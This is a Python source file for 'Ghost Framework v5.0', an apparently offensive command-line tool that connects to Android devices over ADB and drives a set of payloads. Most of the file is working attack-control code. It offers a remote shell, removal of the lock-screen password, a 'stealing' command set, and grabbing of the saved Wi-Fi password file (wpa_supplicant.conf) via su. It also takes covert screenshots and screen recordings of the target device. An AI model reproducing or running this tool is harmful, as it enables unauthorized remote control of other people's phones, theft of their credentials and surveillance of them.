#!/usr/bin/env python3

#            ---------------------------------------------------
#                              Ghost Framework                                                  
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import os

os.system("printf '\033]2;Ghost Framework\a'")

import sys
import subprocess
import readline
import time

Q = '\033[1;77m[?] \033[0m'
G = '\033[1;34m[*] \033[0m'
S = '\033[1;32m[+] \033[0m'
W = '\033[1;33m[!] \033[0m'
E = '\033[1;31m[-] \033[0m'

def autocomplete(text, state):
    import readline
    line = readline.get_line_buffer()
    splitted = line.lstrip().split(" ")

    # no space, autocomplete will be the basic commands:
    options = [x + " " for x in actions if x.startswith(text)]
    options.extend([x + " " for x in remap if x.startswith(text)])
    try:
        return options[state]
    except:
        return None

def get_input(prompt, auto_complete_fn=None, basefile_fn=None):
    try:
        if auto_complete_fn != None:
            import readline
            readline.set_completer_delims(' \t\n;/')
            readline.parse_and_bind("tab: complete")
            readline.set_completer(auto_complete_fn)
    except Exception as e:
        pass

    cmd = input("%s" % prompt)
    return cmd.strip()

readline.set_completer(autocomplete)
readline.parse_and_bind("tab: complete")

def start_server():
    adb = os.popen("which adb").read()
    if adb.strip("\n") == "":
        print(E+"Failed to start Ghost Server!")
        sys.exit()
    else:
        os.system("chmod +x core/server.sh && core/server.sh")

def banner():
    os.system("clear")
    print("")
    os.system("cat banner/banner.txt")
    print("")
    print("Ghost Framework v5.0")
    print("--------------------")
    print("")

def main():
    ui = input('ghost> ')
    while True:
        if ui == "exit":
            print(G+"Stoping Ghost Server...")
            subprocess.Popen("adb kill-server".split(),stdout=open(os.devnull, 'wb'))
            sys.exit()
        elif ui == "clear":
            os.system("clear")
        elif ui == "":
            pass
        elif ui == "update":
            os.system("chmod +x etc/update.sh && etc/update.sh")
        elif ui == "help":
            print("")
            print("Core Commands")
            print("=============")
            os.system("cat data/cmds/core_commands.txt")
            print("")
        elif ui[:7] == "connect":
            if ui[8:] == "":
                print("Usage: connect <device>")
            else:
                print(G+"Connecting to "+ui[8:]+"...")
                os.system("adb connect "+ui[8:]+" > /dev/null")
                str = os.popen("adb devices | grep :5555").read()
                if str == "":
                    print(E+"Failed to connect to "+ui[8:])
                    main()
                time.sleep(0.5)
                print(G+"Sending payload to "+ui[8:]+"...")
                time.sleep(1)
                device = ui[8:]
                con = input('ghost(\033[1;31m'+device+'\033[0m)> ')
                while True:
                    if con == "exit":
                        subprocess.Popen("adb disconnect".split(),stdout=open(os.devnull, 'wb'))
                        break
                    elif con == "clear":
                        os.system("clear")
                    elif con == "":
                        pass
                    elif con == "update":
                        os.system("chmod +x etc/update.sh && etc/update.sh")
                    elif con == "help":
                        print("")
                        print("Core Commands")
                        print("=============")
                        os.system("cat data/cmds/core_commands.txt")
                        print("")
                        print("Settings Commands")
                        print("=================")
                        os.system("cat data/cmds/settings_commands.txt")
                        print("")
                        print("Substrate Commands")
                        print("==================")
                        os.system("cat data/cmds/substrate_commands.txt")
                        print("")
                        print("Stealing Commands")
                        print("=================")
                        os.system("cat data/cmds/stealing_commands.txt")
                        print("")
                        print("Boot Commands")
                        print("=============")
                        os.system("cat data/cmds/boot_commands.txt")
                        print("")
                        print("Other Commands")
                        print("==============")
                        os.system("cat data/cmds/other_commands.txt")
                        print("")
                    elif con == "connect":
                        print(W+"Allready connected to "+device+".")
                    elif con == "eatpass":
                        os.system("chmod +x data/payloads/eatpass && data/payloads/eatpass")
                        print(S+"Password successfully removed!")
                    elif con == "shell":
                        os.system("chmod +x data/payloads/shell && data/payloads/shell")
                    elif con == "reboot":
                        os.system("chmod +x data/payloads/reboot && data/payloads/reboot")
                    elif con == "bootl":
                        os.system("chmod +x data/payloads/bootl && data/payloads/bootl")
                    elif con == "recovery":
                        os.system("chmod +x data/payloads/recovery && data/payloads/recovery")
                    elif con == "sush":
                        os.system("chmod +x data/payloads/sush && data/payloads/sush")
                    elif con == "emulate":
                        os.system("python3 substrate/gsub.py")
                    elif con == "battery":
                        os.system("chmod +x data/payloads/battery && data/payloads/battery")
                    elif con == "activity":
                        os.system("chmod +x data/payloads/activity && data/payloads/activity")
                    elif con == "netstat":
                        os.system("chmod +x data/payloads/netstat && data/payloads/netstat")
                    elif con == "apps":
                        os.system("chmod +x data/payloads/apps && data/payloads/apps")
                    elif con == "log":
                        os.system("chmod +x data/payloads/log && data/payloads/log")
                    elif con == "sysinfo":
                        os.system("chmod +x data/payloads/sysinfo && data/payloads/sysinfo")
                    elif con == "inet":
                        os.system("chmod +x data/payloads/inet && data/payloads/inet")
                    elif con[:4] == "wifi":
                        if con[5:] == "on":
                            os.system("chmod +x data/payloads/wifi && data/payloads/wifi on")
                        elif con[5:] == "off":
                            os.system("chmod +x data/payloads/wifi && data/payloads/wifi off")
                        else:
                            print("Usage: wifi [on|off]")
                    elif con[:8] == "wgrabber":
                        if con[9:] == "":
                            print("Usage: wgrabber <directory>")
                        else:
                            if os.path.exists(con[9:]):
                                os.system("adb shell su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/' > /dev/null")
                                os.system("adb pull /sdcard/wpa_supplicant.conf "+con[9:])
                            else:
                                print(E+"No such directory!")
                    elif con[:10] == "screenshot":
                        if con[11:] == "":
                            print("Usage: screenshot <directory>")
                        else:
                            if os.path.exists(con[11:]):
                                print(G+"Taking screenshot...")
                                os.system("adb shell screencap /sdcard/screen.png > /dev/null")
                                os.system("adb pull /sdcard/screen.png "+con[11:]+" > /dev/null")
                            else:
                                print(E+"No such directory!")
                    elif con[:9] == "screenrec":
                        if con[10:] == "":
                            print("Usage: screenrec <directory>")
                        else:
                            if os.path.exists(con[10:]):
                                print(G+"Recording screen...")
                                print("Type CTRL+C to stop...")
                                os.system("adb shell screenrecord /sdcard/screen.mp4 > /dev/null")
                                os.system("adb pull /sdcard/screen.mp4 "+con[10:]+" > /dev/null")
                            else:
                                print(E+"No such directory!")
                    else:
                        print(E+"Unrecognized command!")
                    con = input('ghost(\033[1;31m'+device+'\033[0m)> ')
        else:
            print(E+"Unrecognized command!")
        ui = input('ghost> ')

start_server()
banner()
main()
